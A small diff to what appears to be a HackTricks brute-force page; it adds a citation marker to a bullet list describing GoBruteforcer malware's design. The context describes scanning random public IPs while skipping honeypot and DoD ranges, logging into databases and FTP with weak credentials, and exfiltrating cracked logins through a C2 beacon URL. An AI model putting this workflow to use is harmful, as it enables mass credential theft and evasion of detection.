@@ -97,7 +97,7 @@ Finished in 0.920s.
 
 ## Internet-wide bruteforcer workflow (lessons from Go-based scanners)
 
-- Maintain **architecture-tuned worker pools** (for example, ~95 goroutines on `x86_64/arm64`, ~85 on `i686`, ~50 on low-end ARM) and respawn every second to keep **fixed concurrency**, with each worker handling exactly one target IP before exiting.
+- Maintain **architecture-tuned worker pools** (for example, ~95 goroutines on `x86_64/arm64`, ~85 on `i686`, ~50 on low-end ARM) and respawn every second to keep **fixed concurrency**, with each worker handling exactly one target IP before exiting.<sup>[[1]](#references)</sup>
 - Generate **random public IPv4s** but drop obvious honeypot-heavy or unroutable ranges: RFC1918, `100.64.0.0/10`, `127.0.0.0/8`, `0.0.0.0/8`, `169.254.0.0/16`, `198.18.0.0/15`, multicast `>=224.0.0.0/4`, cloud-heavy `/8`s (`3/15/16/56`) and DoD-associated `/8`s (`6/7/11/21/22/26/28/29/30/33/55/214/215`).
 - **Probe the service port** with a short timeout (~2s) before attempting **cleartext logins** (FTP/21, MySQL/3306, Postgres/5432, phpMyAdmin over HTTP/80) and fall back to a **small builtin credential list** if the remote dictionary/C2 fetch fails.
 - **Exfiltrate hits** via tiny HTTP GET beacons such as `http://<c2>:9090/pst?i=<ip>&c=<svc_code>&u=<user>&p=<pass>&e=<extra>` (service codes like `1=PMA`, `2=MySQL`, `3=FTP`, `4=Postgres`) while reusing a common browser User-Agent to blend in.
@@ -903,7 +903,7 @@ Cracking Common Application Hashes
 
 ## References
 
-- [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
+- [1] [Inside GoBruteforcer: AI-generated server defaults, weak passwords, and crypto-focused campaigns](https://research.checkpoint.com/2026/inside-gobruteforcer-ai-generated-server-defaults-weak-passwords-and-crypto-focused-campaigns/)
 
 {{#include ../banners/hacktricks-training.md}}
 
